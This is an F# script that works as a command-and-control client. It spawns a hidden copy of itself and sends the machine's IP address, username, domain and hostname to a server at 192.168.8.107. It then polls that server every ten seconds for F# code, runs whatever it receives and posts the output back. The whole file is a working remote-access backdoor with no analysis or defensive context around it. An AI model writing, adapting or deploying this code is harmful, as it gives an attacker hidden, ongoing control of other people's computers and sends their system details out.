open System
open System.Net
open System.Net.Http
open System.Diagnostics
open System.Threading
open System.IO

let spawnNewSession () =
    try
        let startInfo = ProcessStartInfo()
        startInfo.FileName <- "dotnet"
        startInfo.Arguments <- "fsi spawn.fsx --spawned"  // Run the same spawn.fsx script with a flag
        startInfo.UseShellExecute <- false
        startInfo.RedirectStandardOutput <- false
        startInfo.RedirectStandardError <- false
        startInfo.RedirectStandardInput <- false
        startInfo.CreateNoWindow <- true

        // Start a new process to execute the same spawn.fsx script
        let proc = Process.Start(startInfo)
        printfn "Spawned a new session with Process ID: %d" proc.Id
    with
    | ex -> printfn "Error spawning new session: %s" ex.Message

// If the script is running in the original process, spawn a new session
if not (Environment.GetCommandLineArgs() |> Array.exists (fun arg -> arg = "--spawned")) then
    spawnNewSession()


// Function to get machine details
let getMachineDetails () =
    try
        let ipAddress = 
            (Dns.GetHostEntry(Dns.GetHostName())).AddressList 
            |> Array.tryFind (fun ip -> ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork) 
            |> Option.map (fun ip -> ip.ToString()) 
            |> Option.defaultValue "Unknown"
        let username = Environment.UserName
        let domainName = Environment.UserDomainName
        let hostName = Environment.MachineName
        sprintf "%s_%s_%s_%s" ipAddress username domainName hostName
    with
    | ex -> 
        printfn "Error fetching machine details: %s" ex.Message
        "Unknown_Client"

// Function to download the script content as a string
let downloadScriptContent (url: string) =
    async {
        try
            use client = new HttpClient()
            let! scriptContent = client.GetStringAsync(Uri(url)) |> Async.AwaitTask
            return Some scriptContent
        with
        | ex -> 
            printfn "Error downloading script: %s" ex.Message
            return None
    }

// Function to send output to the web server
let sendOutputToServer (url: string) (message: string) (sessionId: string) =
    async {
        try
            use client = new HttpClient()
            let content = new StringContent(message, System.Text.Encoding.UTF8, "text/plain")
            let! response = client.PostAsync(sprintf "%s/receiveOutput?clientId=%s" url sessionId, content) |> Async.AwaitTask
            if response.IsSuccessStatusCode then
                printfn "Output sent to server successfully"
            else
                printfn "Failed to send output to server: %s" (response.ReasonPhrase)
        with
        | ex -> 
            printfn "Error sending output to server: %s" ex.Message
    }

// Function to run the downloaded script content using dotnet fsi
let runScriptContent (scriptContent: string) (sessionId: string) =
    async {
        try
            let startInfo = ProcessStartInfo()
            startInfo.FileName <- "dotnet"
            startInfo.Arguments <- "fsi"
            startInfo.UseShellExecute <- false
            startInfo.RedirectStandardOutput <- true
            startInfo.RedirectStandardError <- true
            startInfo.RedirectStandardInput <- true
            startInfo.CreateNoWindow <- true

            use proc = Process.Start(startInfo)
            use stdInput = proc.StandardInput
            use stdOutput = proc.StandardOutput
            use stdError = proc.StandardError

            stdInput.WriteLine(scriptContent)
            stdInput.Close()

            let output = stdOutput.ReadToEnd()
            let errors = stdError.ReadToEnd()
            proc.WaitForExit()

            printfn "Script Output:\n%s" output
            if errors.Length > 0 then
                printfn "Script Errors:\n%s" errors

            // Send the output and errors to the web server
            let fullOutput = "Script Output:\n" + output + "\nScript Errors:\n" + errors
            do! sendOutputToServer "http://192.168.8.107:8000" fullOutput sessionId
        with
        | ex -> 
            printfn "Error running script: %s" ex.Message
            do! sendOutputToServer "http://192.168.8.107:8000" (sprintf "Exception: %s" ex.Message) sessionId
    }

let rec checkAndExecuteScript (sessionId: string) =
    async {
        try
            let url = sprintf "http://192.168.8.107:8000/scripts/currentscript/%s/currentscript.txt" sessionId
            printfn "Checking for new script at: %s" url

            match! downloadScriptContent url with
            | Some scriptContent ->
                do! runScriptContent scriptContent sessionId
            | None ->
                printfn "No script found or failed to download the script."

            do! Async.Sleep(10000)  // Delay before the next check
            return! checkAndExecuteScript sessionId  // Recurse to keep checking
        with
        | ex -> 
            printfn "Error checking for new scripts: %s" ex.Message
            do! Async.Sleep(10000)  // Delay even in case of error before retrying
            return! checkAndExecuteScript sessionId  // Recurse on error to ensure continuity
    }

let startup () =
    async {
        try
            use client = new HttpClient()
            let content = new StringContent(getMachineDetails(), System.Text.Encoding.UTF8, "text/plain")
            let! response = client.PostAsync("http://192.168.8.107:8000/registerClient", content) |> Async.AwaitTask
            if response.IsSuccessStatusCode then
                let sessionId = response.Content.ReadAsStringAsync().Result
                printfn "Client registered successfully with session ID: %s" sessionId
                Async.Start(checkAndExecuteScript sessionId)  // Start the script checking loop
            else
                printfn "Failed to register client: %s" (response.ReasonPhrase)
        with
        | ex -> 
            printfn "Error registering client: %s" ex.Message
    }

// Execute the startup function directly
Async.RunSynchronously (startup ())


printfn "Client program is running. Press any key to exit..."
Console.ReadKey() |> ignore
